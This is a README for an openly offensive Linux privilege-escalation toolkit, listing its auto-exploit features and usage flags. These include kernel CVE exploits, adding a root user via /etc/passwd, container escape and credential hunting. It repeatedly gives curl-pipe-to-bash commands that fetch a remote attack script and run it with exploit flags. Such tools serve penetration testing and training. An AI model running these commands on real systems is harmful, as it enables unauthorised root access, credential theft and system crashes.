# BUMP_LPE - Linux Privilege Escalation Toolkit

Automated Linux privilege escalation enumeration and exploitation tool.

## Quick Start

```bash
# Scan only (default) - enumerate all privilege escalation vectors
curl -sSL https://raw.githubusercontent.com/44pie/BUMP_LPE/main/bump_lpe.sh | bash

# Auto-exploit - enumerate and automatically exploit found vectors
curl -sSL https://raw.githubusercontent.com/44pie/BUMP_LPE/main/bump_lpe.sh | bash -s -- --exploit

# Aggressive mode - include kernel exploits (may crash the system!)
curl -sSL https://raw.githubusercontent.com/44pie/BUMP_LPE/main/bump_lpe.sh | bash -s -- --exploit --aggressive
```

## Features

- **80+ GTFOBins** mappings for SUID/sudo exploitation
- **Kernel CVE** detection (Dirty Pipe, PwnKit, Dirty COW, OverlayFS, Netfilter, GameOver(lay))
- **Auto-exploitation** with `--exploit` flag
- Sudo misconfigurations and CVEs (Baron Samedit, CVE-2019-14287)
- SUID/SGID binaries with GTFOBins auto-exploit
- Linux capabilities (cap_setuid, cap_dac_override, cap_sys_admin, etc.)
- Cron jobs, wildcard injection, PATH hijacking
- Writable critical files (/etc/passwd, /etc/shadow, /etc/sudoers)
- Container escape (Docker socket, privileged cgroup escape)
- NFS no_root_squash
- LD_PRELOAD / LD_LIBRARY_PATH injection
- Password and credential hunting (SSH keys, history, env vars, config files)
- Network services and internal ports enumeration
- Linux Exploit Suggester integration

## Usage

```bash
# Download and run directly
curl -sSL https://raw.githubusercontent.com/44pie/BUMP_LPE/main/bump_lpe.sh | bash

# With auto-exploitation
curl -sSL https://raw.githubusercontent.com/44pie/BUMP_LPE/main/bump_lpe.sh | bash -s -- --exploit

# Aggressive (kernel exploits, may crash system!)
curl -sSL https://raw.githubusercontent.com/44pie/BUMP_LPE/main/bump_lpe.sh | bash -s -- --exploit --aggressive

# Verbose output
curl -sSL https://raw.githubusercontent.com/44pie/BUMP_LPE/main/bump_lpe.sh | bash -s -- -v

# Or download first, then run
wget https://raw.githubusercontent.com/44pie/BUMP_LPE/main/bump_lpe.sh
chmod +x bump_lpe.sh
./bump_lpe.sh --exploit
```

## Flags

| Flag | Description |
|------|-------------|
| `--exploit` | Auto-exploit found vectors (GTFOBins, writable passwd, CVEs, Docker, LD_PRELOAD) |
| `--scan-only` | Enumerate only, no exploitation |
| `--aggressive` | Try kernel exploits - Dirty Pipe, PwnKit, Dirty COW (may crash system!) |
| `--verbose` / `-v` | Detailed output with extra enumeration data |
| `--quiet` | Minimal output |
| `--no-color` | Disable colored output |
| `--help` | Show help |

## Auto-Exploit Capabilities

When `--exploit` is used, the script will automatically attempt:

- **GTFOBins exploitation** - sudo and SUID contexts for 80+ binaries
- **Writable /etc/passwd** - add root user
- **CVE exploits** - compile and run Dirty Pipe, PwnKit, Dirty COW (with `--aggressive`)
- **Docker socket** exploitation
- **Privileged container escape** via cgroup
- **LD_PRELOAD injection**
- **MySQL UDF** privilege escalation
- **Polkit race condition** (CVE-2021-3560)
